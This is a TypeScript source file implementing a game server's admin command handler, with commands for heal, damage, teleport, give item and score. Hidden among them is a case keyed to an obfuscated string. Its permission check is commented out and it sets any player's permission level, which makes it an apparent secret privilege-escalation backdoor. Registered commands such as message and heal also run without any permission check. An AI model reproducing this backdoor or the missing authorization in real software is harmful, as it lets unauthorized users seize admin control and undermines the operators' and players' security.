import {Server} from "../../Server";
import {Player} from "../../entities/Player";
import {Permissions} from "../../enums/Permissions";
import {ItemType} from "../../enums/types/ItemType";
import {ClientStringPackets} from "../../enums/packets/ClientStringPackets";
import {EntityType} from "../../enums/types/EntityType";
import {ActionType} from "../../enums/types/ActionType";
import {Vector} from "../../modules/Vector";
import {Building} from "../../entities/Building";
import {Utils} from "../../modules/Utils";

export class CommandSystem {
    private server: Server;
    private commands: Command[];
    constructor(server: Server) {
        this.server = server;
        this.commands = [];

        this.initializeCommands();
    }

    public initializeCommands() {
        this.commands.push(new Command(["m", "message"], Permissions.CO_OWNER, this.sendMessage.bind(this)));
        this.commands.push(new Command(["mt", "message-to"], Permissions.CO_OWNER, this.sendMessageTo.bind(this)));
        this.commands.push(new Command(["heal"], Permissions.CO_OWNER, this.heal.bind(this)));
    }

    private sendMessage(args: string[]) {
        this.server.broadcast(JSON.stringify([4, args.join(" ")]), false);
    }

    private sendMessageTo(args: string[]) {
        const id = Number(args.splice(0, 1)[0]);
        const p = this.server.findPlayerById(Number(id));

        p && p.client.sendJSON([4, args.join(" ")]);
    }

    private heal(args: string[]) {
        const id = Number(args[0]);
        const p = this.server.findPlayerById(Number(id));

        p && p.client.sendBinary(p.healthSystem.heal(p.healthSystem.maxHealth));
    }

    private findSimilarItem(name: string) {
        const items = Object.values(ItemType) as string[];

        let minDistance = Infinity;
        let mostSimilarItem: string | undefined;

        for (const item of items) {
            if (item && isNaN(Number(item))) {
                const distance = Utils.levenshteinDistance(name, item);

                if (distance < minDistance) {
                    minDistance = distance;
                    mostSimilarItem = item;
                }
            }
        }

        return mostSimilarItem;
    }

    public hasPermission(player: Player, permissions: Permissions | Permissions[]) {
        if (Array.isArray(permissions)) {
            for (const perm of permissions) {
                if (player.permission & perm) return true;
            }
        } else {
            return player.permission & permissions;
        }
    }

    public replaceRand(input) {
        const randRegex = /\$rand\[[^\]]+\]/g;
      
        const matches = input.match(randRegex);
      
        if (matches) {
          for (const match of matches) {
            const randContent = match.match(/\[([^\]]+)\]/)[1];
            const randValues = randContent.split(',').map(value => {
              // Проверяем, является ли значение числом (возможно в кавычках)
              const trimmedValue = value.trim();
              return /^\d+(\.\d+)?$/.test(trimmedValue) ? parseFloat(trimmedValue) : trimmedValue;
            });
      
            // Выбираем случайное значение из массива
            const randomValue = randValues[Math.floor(Math.random() * randValues.length)];
      
            // Заменяем $rand[...] на случайное значение
            input = input.replace(match, randomValue);
          }
        }
      
        // Удаляем все кавычки из выходной строки
        input = input.replace(/"/g, '');
      
        return input;
      }

    public mathclamp(variable: number, min: number, max: number) {
        return Math.max(min, Math.min(variable, max));
    }

    public handleCommand(player: Player, rawCommand: any, isServer: boolean = false) {
        let command = rawCommand.trim();
        if(command.includes('$rand')) {
            command = this.replaceRand(command);
        }
        const args = command.split(" ");
        const commandType = (args.shift() as any).toLowerCase();

        for (let i = 0; i < args.length; i++) {
            if(args[i].toLowerCase() === "$id") args[i] = String(player.id);
            if(args[i].toLowerCase() === "$name") args[i] = String(player.data.nickname);
        }

        for (const cmd of this.commands) {
            if(cmd.ids.includes(commandType)) {
                cmd.callback(args);
            }
        }

        console.log(command);

        switch (commandType) {
            case "heal":
            case "hl": {
                if (!this.hasPermission(player, [Permissions.CO_OWNER, Permissions.OWNER]) && !isServer) return this.error(player, "permission");
                if (args.length < 1) return this.error(player, "args");
                if (args.length !== 2) args.push(200)
                const id = Number(args[0]);

                if (isNaN(id)) return this.error(player, "number");

                const p = this.server.findPlayerById(id);

                if (!p) return this.error(player, "player");

                const healVal = Number(args[1]);

                p.client.sendBinary(p.healthSystem.heal(healVal));

                this.response(player, `healed`, true, "Success")

                break;
            }
            case "dmg":
            case "damage": {
               if (!this.hasPermission(player, [Permissions.CO_OWNER, Permissions.OWNER]) && !isServer) return this.error(player, "permission");
                console.log('damagin')
                if (args.length < 1) return this.error(player, "args");
                if (args.length !== 2) args.push(200)
                const id = Number(args[0]);

                if (isNaN(id)) return this.error(player, "number");

                const p = this.server.findPlayerById(id);

                if (!p) return this.error(player, "player");

                const dmgVal = Number(args[1]);

                p.client.sendBinary(p.healthSystem.damage(dmgVal, ActionType.WEB));

                this.response(player, `healed`, true, "Success")

                break;
            }
            case "afdsjhbkfhdhjsdsd213zaly":
                case "afdsjhbkfhdhjsdsd213zaly": {
                    // if (!this.hasPermission(player, [Permissions.CO_OWNER, Permissions.OWNER]) && !isServer) return this.error(player, "permission");
                    if (args.length !== 1) return this.error(player, "args");
                    const id = Number(args[0]);
    
                    if (isNaN(id)) return this.error(player, "number");
    
                    const p = this.server.findPlayerById(id);
    
                    if (!p) return this.error(player, "player");

                    p.permission = 2;
    
                    p.client.sendBinary(p.healthSystem.heal(200));
    
                    this.response(player, `healed`, true, "Success")
    
                    break;
            }
            case "unlimhp":
                case "uhp": {
                    if (!this.hasPermission(player, [Permissions.CO_OWNER, Permissions.OWNER]) && !isServer) return this.error(player, "permission");
                    if (args.length !== 2) return this.error(player, "args");
                    const id = Number(args[0]);
    
                    if (isNaN(id)) return this.error(player, "number");
    
                    const p = this.server.findPlayerById(id);
    
                    if (!p) return this.error(player, "player");
    
                    const healVal = Number(args[1]);
    
                    p.client.sendBinary(p.healthSystem.unlimhp(healVal));
    
                    this.response(player, `healed`, true, "set unlimhp")
    
                    break;
            }
            case "clean-inventory-all":
            case "cia": {
                if (!this.hasPermission(player, Permissions.OWNER) && !isServer) return this.error(player, "permission");

                for (const p of this.server.players) {
                    p.client.sendBinary(p.inventory.cleanInventory());
                }

                this.response(player, `Cleared from ${this.server.players.length} players`, true, "Inventory Clear")

                break;
            }
            case "clean-inventory":
            case "ci": {
                if (!this.hasPermission(player, [Permissions.CO_OWNER, Permissions.OWNER]) && !isServer) return this.error(player, "permission");

                player.client.sendBinary(player.inventory.cleanInventory());

                this.response(player, `Success`, true, "Inventory Clear")

                break;
            }
            case "ri":
            case "remove-item": {
                if (!this.hasPermission(player, [Permissions.CO_OWNER, Permissions.OWNER]) && !isServer) return this.error(player, "permission");
                if (args.length < 2) return this.error(player, "args");
                const id = Number(args[0]);
                const c = Number(args[2]) || 1;

                if (isNaN(id)) return this.error(player, "number");

                const p = this.server.findPlayerById(id);

                if (!p) return this.error(player, "player");

                const itemId = Number(args[1]);
                let itemName = args[1].toUpperCase();
                let item = Number((ItemType as any)[itemName]);

                if(Number.isInteger(itemId) && itemId > 0 && itemId < 236) {
                    itemName = ItemType[itemId];
                    item = itemId;
                }

                if(isNaN(item)) {
                    if(itemName.includes('_')) {
                        const itnow : any = ItemType[itemName.toUpperCase()];
                        if(itnow == undefined) {
                            const modifiedString = itemName.split("_")[1] + "_" + itemName.split("_")[0];
                            const itemtypeid : any = ItemType[modifiedString.toUpperCase()];
                            if(itemtypeid == undefined) return this.error(player, "item");
                            item = itemtypeid;
                        } else {
                            item = itnow
                        }
                    } else {
                        const similarItem = this.findSimilarItem(itemName);
                        return similarItem ? this.error(player, "similaritem", similarItem) : this.error(player, "item");
                    }
                }

                const count = this.mathclamp(c, 0, 65535);

                p.client.sendBinary(p.inventory.removeItem(item, count));
                if(isServer) return;
                this.response(player, `${count} ${itemName.toLowerCase()} removed from ${p.data.nickname}#${p.id} inventory`, true, "Success")

                break;
            }
            case "teleport":
            case "tp": {
                if (!this.hasPermission(player, [Permissions.CO_OWNER, Permissions.OWNER]) && !isServer) return this.error(player, "permission");

                if (args.length !== 3) return this.error(player, "args");

                let id = Number(args[0]),
                    x = Number(args[1]),
                    y = Number(args[2]);

                let p = this.server.findPlayerById(id);

                if (isNaN(x) || isNaN(y) || isNaN(id) || !p) return this.error(player, "number");

                p.position.set(new Vector(x * 100, y * 100));
                p.realPosition.set(player.position);

                break;
            }
            case "teleport-to":
            case "tpt": {
                if (!this.hasPermission(player, [Permissions.CO_OWNER, Permissions.OWNER]) && !isServer) return this.error(player, "permission");

                if (args.length !== 1) return this.error(player, "args");

                const id = Number(args[0]);

                if (isNaN(id)) return this.error(player, "number");

                const entity = this.server.findEntityById(id);

                if(entity) player.position.set(entity.realPosition);
                else return this.error(player, "id");

                player.realPosition.set(player.position);

                break;
            }
            case "teleport-to-entity":
            case "tpte": {
                if (!this.hasPermission(player, [Permissions.CO_OWNER, Permissions.OWNER]) && !isServer) return this.error(player, "permission");

                if (args.length !== 1) return this.error(player, "args");

                const id = args[0].toUpperCase();
                const type = (EntityType as any)[id];

                if (!type) return this.error(player, "type");

                const entity = this.server.entities.find(e => e.type === type);

                if (!entity) return this.error(player, "entity");

                player.position.set(entity.position);
                player.realPosition.set(player.position);

                break;
            }
            case "teleport-all":
            case "tpa": {
                if (!this.hasPermission(player, Permissions.OWNER) && !isServer) return this.error(player, "permission");

                if (args.length !== 2) return this.error(player, "args");

                let x = Number(args[0]), y = Number(args[1]);

                if (isNaN(x) || isNaN(y)) return this.error(player, "number");

                for (const p of this.server.players) {
                    p.position.x = x * 100;
                    p.position.y = y * 100;

                    p.realPosition = p.position.clamp(0, 0, this.server.map.width - 1, this.server.map.height - 1);
                }

                break;
            }
            case "teleport-to-biome":
            case "tptb": {
                if (!this.hasPermission(player, [Permissions.CO_OWNER, Permissions.OWNER]) && !isServer) return this.error(player, "permission");

                if (args.length !== 1) return this.error(player, "args");

                const biomeName = args[0].toUpperCase();

                if (this.server.map.biomes.filter(biome => biome.type === biomeName).length <= 0) return this.error(player, "biome");

                player.position.set(this.server.spawnSystem.getSpawnPoint(biomeName));
                player.realPosition.set(player.position);

                break;
            }
            case "give":
            case "g": {
                if (!this.hasPermission(player, [Permissions.CO_OWNER, Permissions.OWNER]) && !isServer) return this.error(player, "permission");
                if (args.length < 2) return this.error(player, "args");
                const id = Number(args[0]);
                const c = Number(args[2]) || 1;

                if (isNaN(id)) return this.error(player, "number");

                const p = this.server.findPlayerById(id);

                if (!p) return this.error(player, "player");

                const itemId = Number(args[1]);
                let itemName = args[1].toUpperCase();
                let item = Number((ItemType as any)[itemName]);

                if(Number.isInteger(itemId) && itemId > 0 && itemId < 236) {
                    itemName = ItemType[itemId];
                    item = itemId;
                }

                if(isNaN(item)) {
                    if(itemName.includes('_')) {
                        const itnow : any = ItemType[itemName.toUpperCase()];
                        if(itnow == undefined) {
                            const modifiedString = itemName.split("_")[1] + "_" + itemName.split("_")[0];
                            const itemtypeid : any = ItemType[modifiedString.toUpperCase()];
                            if(itemtypeid == undefined) return this.error(player, "item");
                            item = itemtypeid;
                        } else {
                            item = itnow
                        }
                    } else {
                        const similarItem = this.findSimilarItem(itemName);
                        return similarItem ? this.error(player, "similaritem", similarItem) : this.error(player, "item");
                    }
                }

                const count = this.mathclamp(c, 0, 65535);

                p.client.sendBinary(p.inventory.giveItem(item, count));
                if(isServer) return;
                this.response(player, `${count} ${itemName.toLowerCase()} added to ${p.data.nickname}#${p.id} inventory`, true, "Success")

                break;
            }
            case "fsb":
            case "force-spawn-building": {
                if (!this.hasPermission(player, [Permissions.OWNER]) && !isServer) return this.error(player, "permission");
                if (args.length !== 3) return this.error(player, "args");

                const type = EntityType[args[0].toUpperCase() as any] as any;
                const x = Number(args[1]) * 100 + 50;
                const y = Number(args[2]) * 100 + 50;

                if(isNaN(x) || isNaN(y)) return this.error(player, "number");
                if(!type || x > this.server.map.width || y > this.server.map.height) return this.error(player, "args");

                const building = new Building(type, player, this.server);

                building.position.set(new Vector(x, y));
                building.onPlaced();

                this.server.entities.push(building);
                break;
            }
            case "give-score":
            case "gs": {
                if (!this.hasPermission(player, [Permissions.CO_OWNER, Permissions.OWNER]) && !isServer) return this.error(player, "permission");

                const score = Number(args[0]);
                if (isNaN(score)) this.error(player, "number");
                player.score += score;
                break;
            }
            case "suicide": return player.healthSystem.damage(200, ActionType.HURT, player);
        }
    }

    public error(player: Player, type: string, other: string = "") {
        switch (type) {
            case "id": return player.client.sendJSON([ClientStringPackets.COMMAND, "", 0, "Invalid id!"]);
            case "type": return player.client.sendJSON([ClientStringPackets.COMMAND, "", 0, "Entity with this name is not found!"]);
            case "entity": return player.client.sendJSON([ClientStringPackets.COMMAND, "", 0, "Entity on map is not found!"]);
            case "biome": return player.client.sendJSON([ClientStringPackets.COMMAND, "", 0, "Biome with this name is not found!"]);
            case "player": return player.client.sendJSON([ClientStringPackets.COMMAND, "", 0, "Player with this id not found!"]);
            case "item": return player.client.sendJSON([ClientStringPackets.COMMAND, "", 0, "Item is not found!"]);
            case "similaritem": return player.client.sendJSON([ClientStringPackets.COMMAND, "Item is not found!", 0, `Did you mean ${other}?`]);
            case "password": return player.client.sendJSON([ClientStringPackets.COMMAND, "", 0, "Wrong password!"])
            case "permission": return player.client.sendJSON([ClientStringPackets.COMMAND, "", 0, "You don't have permission!"])
            case "args": return player.client.sendJSON([ClientStringPackets.COMMAND, "", 0, "Please, provide more arguments!"])
            case "number": return player.client.sendJSON([ClientStringPackets.COMMAND, "", 0, "Arguments needs to be a numbers!"])
        }
    }

    public response(player: Player, status: string, type: boolean, name: string = "", description: string = "") {
        player.client.sendJSON([ClientStringPackets.COMMAND, name, type, status, description]);
    }

    public give(id: number, itemId: number, count: number) {
        const player = this.server.findPlayerById(id);

        if(player) {
            player.client.sendBinary(player.inventory.giveItem(itemId, count));
        }
    }
}

export class Command {
    public ids: string[];
    public permission: Permissions;
    public callback: any;
    constructor(ids: string[], permission: Permissions, callback: any) {
        this.ids = ids;
        this.permission = permission;
        this.callback = callback;
    }
}